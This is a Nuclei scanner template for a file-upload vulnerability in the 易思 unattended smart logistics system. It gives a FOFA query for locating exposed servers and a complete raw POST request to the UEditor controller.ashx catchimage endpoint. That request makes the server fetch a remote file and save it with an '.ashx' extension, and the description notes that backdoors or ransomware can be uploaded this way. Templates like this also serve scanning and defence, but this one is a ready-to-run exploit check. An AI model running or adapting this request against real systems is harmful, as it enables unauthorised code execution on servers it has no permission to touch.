id: yisi-smart-logistics-controller-upload

info:
  name: 易思无人值守智能物流系统 controller.ashx 文件上传漏洞
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="易思无人值守智能物流"
      该系统 controller.ashx 处理模块存在文件上传安全缺陷，攻击者可利用该漏洞上传恶意代码（如后门、远程执行组件或加密勒索模块），从而实现对目标服务器的未授权访问或系统功能破坏。
  tags: 易思无人值守智能物流系统

http:
- raw:
  - |
    POST /Content/scripts/plugins/ueditor/net/controller.ashx?action=catchimage HTTP/1.1
    Host: {{Hostname}}
    Upgrade-Insecure-Requests: 1
    Priority: u=1
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded

    source[]=https://www.baidu.com/img/flexible/logo/pc/result.png?.ashx
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'success'
